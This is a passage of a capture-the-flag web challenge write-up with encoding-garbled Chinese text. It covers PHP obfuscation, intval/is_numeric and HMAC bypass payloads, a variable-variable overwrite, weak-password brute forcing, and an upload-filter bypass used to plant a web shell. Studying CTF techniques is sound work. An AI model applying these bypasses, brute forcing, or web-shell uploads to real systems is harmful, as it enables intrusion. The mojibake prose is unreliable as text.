class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmtwT1ZtMW9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doVlYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmtwT1ZtMW9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doVlYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedVYmtwT1ZtMW9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedTV0d4VVYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGRPVldScFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2QyVklhuh;!_&amp;%l@das%dbuioowedVWGlhuh;!_&amp;%l@das%dbuioowedUV0docFVtMVNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldSWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowed&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklUm1SWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGxTYmxKWFlUSm9WRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUWGROVldSWVYwZG9WVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedTWGlhuh;!_&amp;%l@das%dbuioowedXV0doVlYwZDRWRmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">Vm0wd2VHUXlhuh;!_&amp;%l@das%dbuioowedUblJXYTFwUFZsZFNWVmx0ZElhuh;!_&amp;%l@das%dbuioowedkVlZscDBUVl&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklPVmsxWGVIbFdiVFZyVm0xS1IyTkliRmRXTTFKTVZsVmFWMV&amp;)bulhuh;!_&amp;%l@das%dbuioowed;!_&amp;%l@as%bagsdec#%bbuh;!_&amp;%ls@asc%bbzfdklWTVVWaGVqQTk&#x3D;</span><br><span class="line">asdfiohaefho;</span><br><span class="line">$_ &#x3D; preg_replace(&quot;&#x2F;c#%bbuh;!_&amp;%ls@asc%bbzfd&#x2F;s&quot;, &#39;p&#39;, $_);</span><br><span class="line">$_ &#x3D; preg_replace(&quot;&#x2F;lhuh;!_&amp;%l@das%dbuioowed&#x2F;s&quot;, &#39;h&#39;, $_);</span><br><span class="line">$_ &#x3D; preg_replace(&quot;&#x2F;&amp;\)buh;!_&amp;%l@as%bagsdepkl&#x2F;s&quot;, &#39;p&#39;, $_);</span><br><span class="line">$__ &#x3D; explode(&quot;\n&quot;, $_);</span><br><span class="line">echo count($__);</span><br><span class="line">foreach ($__ as $____ &#x3D;&gt; $_____) </span><br><span class="line">    &#123;</span><br><span class="line">        for($_qpalzmxncbvsjdhfgryeuwi&#x3D;0;$_qpalzmxncbvsjdhfgryeuwi&lt;10;$_qpalzmxncbvsjdhfgryeuwi++)</span><br><span class="line">        &#123;$_____ &#x3D; base64_decode($_____);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>çœ‹åˆ°å¥½åƒè¿˜æ˜¯å¾ˆä¹±å¾ˆå¤šï¼Œå…¶å®ä»”ç»†ä¸€çœ‹ä¹ŸæŒºç®€å•çš„ï¼Œå°±æ˜¯å¯¹ä¸€å¤§ä¸²å­—ç¬¦ä¸²å¤„ç†</p><p>æœ¬åœ°æµ‹è¯•ä¸€ä¸‹è®©å®ƒè¾“å‡ºå˜é‡è¯•è¯•ï¼Œå‘ç°åªæœ‰æ”¾åˆ°ä¸‹å›¾è¿™æ ·æ‰ä¼šè¾“å‡ºå°‘é‡ä¸œè¥¿ï¼Œå…¶å®ƒå¥½åƒéƒ½ä¸å¤ªåƒflag</p><p><img src="/2019/08/15/drops-new-2019/20190810182541.png"></p><p>è¿™ä¸ªåƒä¸åƒå¸¸è§çš„ç½®æ¢å¯†ç ï¼Œè¯•äº†è¯•æ˜¯ROT13åŠ å¯†</p><pre><code>flag&#123;php_is_the_best_language&#125;</code></pre><h3 id="Hi-WALLE"><a href="#Hi-WALLE" class="headerlink" title="Hi~WALLE"></a>Hi~WALLE</h3><p>æ‹¿åˆ°é¢˜ç›®æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="/2019/08/15/drops-new-2019/20190810183622.png"></p><p>dirseachä¸€æ‰«ï¼Œå‘ç°<code>robots.txt</code></p><p>è®¿é—®ä¸€çœ‹ï¼Œæœ‰ä¸ªéšè—ç›®å½•ï¼Œ<code>/easy_challenge/web/dropsec/shell</code></p><p>è®¿é—®éšè—ç›®å½•ï¼Œæç¤ºflagä¸åœ¨è¿™é‡Œ</p><p>ç”¨å·¥å…·å†æ‰«ä¸€ä¸‹è¿™ä¸ªç›®å½•å§ï¼Œæœ‰ä¸ª<code>shell.php</code>,è®¿é—®å‡ºç°ç‚¹æˆ‘æœ‰æƒŠå–œæç¤ºï¼Œæ–¹å‘å¥½åƒå¯¹äº†ï¼Œå†ç‚¹å¼€ï¼Œæœ€å‘çˆ¹çš„åœ°æ–¹æ¥äº†ï¼Œä¹Ÿæ˜¯è¿™ä¸ªåœ°æ–¹è®©æˆ‘çŸ¥é“ä¸ºå•¥æœ‰ä»£æ‰“å‡ºé¢˜äººä¸šåŠ¡äº†ï¼Œä¸€æŠŠå¿ƒé…¸æ³ªå•Š</p><p><img src="/2019/08/15/drops-new-2019/20190810184641.png"></p><p>ä»”ç»†è§‚å¯Ÿï¼Œå‘ç°æœ‰ä»€ä¹ˆä¸åŒæ²¡ï¼Ÿ</p><p><code>dr0psec</code> <code>drOpsec</code></p><p>ä¸€ä¸ªæ˜¯0ï¼Œä¸€ä¸ªæ˜¯O,å®ƒè®©æˆ‘ä»¬ä¼ ä¸€ä¸ªå‚æ•°ï¼Œåˆšå¼€å§‹ä¸€ç›´æ˜¯Urlä¸Šé‚£ä¸ªå‚æ•°ï¼Œä¸€ç›´æ²¡è¿›å±•</p><p>æ¢æˆdr0psecéšä¾¿è¾“ä¸ª1ï¼Œå‘ç°æç¤º<code>too small</code>,è¾“ä¸ª10000 æç¤º<code>too big</code></p><p>å¾ˆæ˜æ˜¾bpçˆ†ç ´å°±è¡Œï¼Œå½“=2333æ—¶æœ‰flag</p><pre><code>flag&#123;l0ve_walle_robots&#125;</code></pre><h3 id="easy-audit1"><a href="#easy-audit1" class="headerlink" title="easy audit1"></a>easy audit1</h3><p>æ‹¿åˆ°é¢˜ç›®æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if(empty($_GET)) </span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die(&quot;get get get get args&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$a1&#x3D;$_GET[&#39;a1&#39;];</span><br><span class="line">$a2&#x3D;$_GET[&#39;a2&#39;];</span><br><span class="line">$a3&#x3D;$_GET[&#39;a3&#39;];</span><br><span class="line">$a4&#x3D;$_GET[&#39;a4&#39;];</span><br><span class="line">$obstacle_1&#x3D;is_numeric($a2) and is_numeric($a1);</span><br><span class="line">if(!$obstacle_1) exit(&quot;foolish&quot;);</span><br><span class="line"></span><br><span class="line">if(!(intval($a2)&lt;1024 and intval($a2+1)&gt;1024)) exit(&quot;emmmmm&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($a1))</span><br><span class="line">&#123;</span><br><span class="line">    $secret&#x3D;hash_hmac(&#39;sha256&#39;,$a1,$secret);</span><br><span class="line">&#125;</span><br><span class="line">$hmac&#x3D;hash_hmac(sha256,$a2,$secret);</span><br><span class="line">if($a3!&#x3D;&#x3D;$hmac)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    die(&quot;OMG&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;give you flag: &quot;.$flag;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">get get get get args</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶æ˜¯ä¸€é“ä»£ç å®¡è®¡é¢˜ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯æ€æ ·ç»•è¿‡</p><p>è§‚å¯Ÿé¢˜ç›®å‘ç°å¯ä»¥ä¼ 4ä¸ªå‚æ•°ï¼ŒGETæ–¹å¼</p><p>å¹¶ä¸”a1,a2è¦ä¸ºæ•°å­—</p><p>å¦‚æœæœ‰ä¸¤ä¸ªis_numericåˆ¤æ–­çš„æ—¶å€™ç”¨andè¿æ¥èµ·æ¥ï¼Œandåé¢çš„is_numbericåˆ¤æ–­å¯å¿½ç•¥</p><p>è¿˜è¦<code>intval($a2)&lt;1024 and intval($a2+1)&gt;1024</code>ï¼Œè¿™é‡Œçš„intval() å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ï¼Œå¯ä»¥ç”¨16è¿›åˆ¶æˆ–è€…ç§‘å­¦è®°æ•°æ³•è¿›è¡Œç»•è¿‡</p><p>intval(å­—ç¬¦ä¸²)ä¸º0ï¼Œintval(å­—ç¬¦ä¸²+1) ä¼šè‡ªåŠ¨è½¬æ¢æˆæ•°å€¼çš„ï¼Œäº‹å®ä¸Šæ˜¯å­—ç¬¦ä¸²å’Œæ•°å­—è¿ç®—æ—¶å‘ç”Ÿäº†è½¬æ¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a2&#x3D;&#39;1e9&#39;;</span><br><span class="line">echo intval($a2);#è¾“å‡º1</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo intval($a2+1);#è¾“å‡º100000001</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo $a2+1;#è¾“å‡º100000001</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>hash_hmac()å‡½æ•°æ˜¯ç”Ÿæˆå¸¦æœ‰å¯†é’¥çš„å“ˆå¸Œå€¼ï¼Œæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œå¦‚æœä¼ å…¥åŠ å¯†çš„å­—ç¬¦ä¸²ä¸ºæ•°ç»„ï¼Œå‡½æ•°å°†è¿”å›ç©ºå­—ç¬¦ä¸²ï¼Œå°±å¯ä»¥é€šè¿‡æ§åˆ¶a1çš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥è®©$secretä¸ºç©ºï¼Œé‚£ä¹ˆ$hmacå°±å¯ä»¥æ§åˆ¶äº†</p><p>cmdæœ¬åœ°æµ‹è¯•ä¸€ä¸‹ç®—ä¸‹$a2ç”¨sha256ç®—æ³•åŠ å¯†åçš„ç»“æœï¼Œè¿™é‡Œ$a2å–1e5,æ³¨æ„$a2è¦ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œå³åŠ ä¸Šå•å¼•å·æˆ–åŒå¼•å·</p><pre><code>e6f66665054a43d574b8c3fb1599d6cbbc8760191d270428f2213b000f16b7e6</code></pre><p><img src="/2019/08/15/drops-new-2019/20190812224837.png"></p><pre><code>payload1:?a1[]=1&amp;a2=1e5&amp;a3=e6f66665054a43d574b8c3fb1599d6cbbc8760191d270428f2213b000f16b7e6</code></pre><p>å½“ç„¶a1ä¹Ÿå¯ä»¥ä¸ä¸ºæ•°ç»„</p><pre><code>payload2:?a1=1&amp;a2=1e5&amp;a3=4dd2fa37e9fe33eccec13b3adcfc9c0d86e074c8e369d9d9d9db00a2c0c75ca3flag&#123;didhfahffdjhcj38ash8y&#125;</code></pre><h3 id="easy-audit2"><a href="#easy-audit2" class="headerlink" title="easy audit2"></a>easy audit2</h3><p>æ‰“å¼€é¢˜ç›®åˆæ˜¯é“ä»£ç å®¡è®¡é¢˜ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#39;flag.php&#39;);</span><br><span class="line">$flag &#x3D; &#39;xxxxxxxxxxxxxx&#39;;</span><br><span class="line">foreach ($_POST as $key &#x3D;&gt; $value) &#123;</span><br><span class="line">    $a &#x3D; $value;</span><br><span class="line">    $$$key&#x3D;$value;</span><br><span class="line">    $ccut &#x3D; $flag;</span><br><span class="line">    $yml &#x3D; $_GET[&quot;flag&quot;];</span><br><span class="line">    if ($yml &#x3D;&#x3D; &quot;iwantflag&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($ccut &#x3D;&#x3D; &quot;flag&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            echo $fl4g;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;you will get it&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;nonono&quot;;</span><br><span class="line">    &#125;    </span><br><span class="line">    # code...</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);   </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>ä»”ç»†çœ‹çœ‹ï¼Œè¿™é“é¢˜çš„æ„æ€å°±æ˜¯æŠŠPOSTè¿‡æ¥çš„æ•°ç»„é”®å€¼éå†ï¼ŒGETæ¥æ”¶ä¸€ä¸ªflagçš„å‚æ•°</p><p>è¾“å‡ºflagçš„æ–¹å¼å°±æ˜¯è®©GETæ–¹å¼æäº¤çš„å‚æ•°flagä¸º<code>â€™iwantflagâ€™</code>ï¼Œ$ccutä¸ºâ€™flagâ€™,è€Œ<code>$ccut = $flag</code>,æ‰€ä»¥å°±è½¬å˜æˆè®©<code>$flag=â€™flagâ€™</code>çš„é—®é¢˜äº†ï¼Œè¿™é‡Œæˆ‘ä¹Ÿä¸ç»•å¼¯äº†ï¼Œé¦–å…ˆè¦äº†è§£phpå¯å˜å˜é‡çš„æ¦‚å¿µ,å…·ä½“ç™¾åº¦</p><p><img src="/2019/08/15/drops-new-2019/20190812233048.png"></p><p>payloadï¼š</p><pre><code>GET:?flag=iwantflagPOST:a=flagè§£é‡Šä¸€ä¸‹ï¼Œå½“POSTè¿‡å»a=flagæ—¶$key=â€™aâ€™,$value=â€™flagâ€™,åˆå› ä¸º$a = $valueï¼Œåˆ™$a=â€™flagâ€™,$$$key=$$a=$flag=$value=â€™flagâ€™,æ„é€ æˆåŠŸflag&#123;Varivables-are-covered-MX&#125;</code></pre><h3 id="loginlogin"><a href="#loginlogin" class="headerlink" title="loginlogin"></a>loginlogin</h3><p>æ‹¿åˆ°é¢˜ç›®æ˜¯ä¸ªç™»å½•ç•Œé¢ï¼š</p><p><img src="/2019/08/15/drops-new-2019/20190812233404.png"></p><p>bpæŠ“åŒ…ï¼Œçœ‹åˆ°è¿™ä¸ªæç¤ºï¼Œæ„æ€æ˜¯è¯´åˆå§‹è´¦å·å¯†ç åˆ†åˆ«ä¸º<code>dropsec_admin</code>ï¼Œ<code>123456</code></p><p><img src="/2019/08/15/drops-new-2019/20190812233631.png"></p><p>å°è¯•ç”¨è¿™ä¸ªç™»é™†ï¼Œå‘ç°æ ¹æœ¬æ²¡ååº”ï¼Œç”±æ­¤æˆ‘ä»¬æƒ³å¯èƒ½æ˜¯ä¸ªå‡çš„ç™»é™†é¡µé¢ï¼Œdirsearchæ‰«ä¸‹å§ï¼Œå‘ç°äº†<code>login.php</code>,è®¿é—®ä¸€ä¸‹ï¼Œæ˜¯ä¸ªGETæ–¹å¼çš„ç™»é™†ï¼Œæ„Ÿè§‰å¥½lowï¼Œå°è¯•ç”¨é»˜è®¤è´¦å·å¯†ç ç™»é™†ï¼Œæç¤º<code>login failed</code>ï¼Œbpçˆ†ç ´ä¸€ä¸‹å¼±å£ä»¤å§,ç®¡ç†å‘˜è´¦å·åº”è¯¥ä¸ä¼šæ”¹ï¼Œè¿™é‡Œé€‰æ‹©passwordè¿™ä¸ªå­—å…¸</p><p><img src="/2019/08/15/drops-new-2019/20190812234618.png"></p><p>å¯†ç ä¸ºADMIN</p><p><img src="/2019/08/15/drops-new-2019/20190812234732.png"></p><p>ç™»é™†è¿›å»å‘ç°å¥½åƒåˆå˜æˆè€ƒå¯Ÿæ–‡ä»¶ä¸Šä¼ äº†ï¼Œå¹¶ä¸”æç¤ºåªèƒ½ä¸Šä¼ jpgæ–‡ä»¶</p><p>å…ˆä¸Šä¼ ä¸ªä¸€å¥è¯è¯•è¯•ï¼ŒbpæŠ“ä¸‹åŒ…ï¼Œæ”¹ä¸‹MIME(Content-Type)</p><p><img src="/2019/08/15/drops-new-2019/20190813000235.png"></p><p>å‘ç°æç¤ºï¼šæœåŠ¡å™¨æŠŠphpæ‰©å±•åæ›¿æ¢æˆç©ºäº†</p><p><img src="/2019/08/15/drops-new-2019/20190813000357.png"></p><p>æˆ‘ä»¬æƒ³åˆ°åŒå†™ç»•è¿‡ï¼Œç›´æ¥å†bpé‡Œæ”¹ï¼Œæ³¨æ„phpåŒå†™ç»•è¿‡åªæœ‰<code>.pphphp</code>ä¸€ç§æ–¹å¼</p><p><img src="/2019/08/15/drops-new-2019/20190813000739.png"></p><pre><code>flag&#123;dont_do_things_carelessly&#125;</code></pre><h3 id="ji-ni-tai-mei"><a href="#ji-ni-tai-mei" class="headerlink" title="ji ni tai mei!"></a>ji ni tai 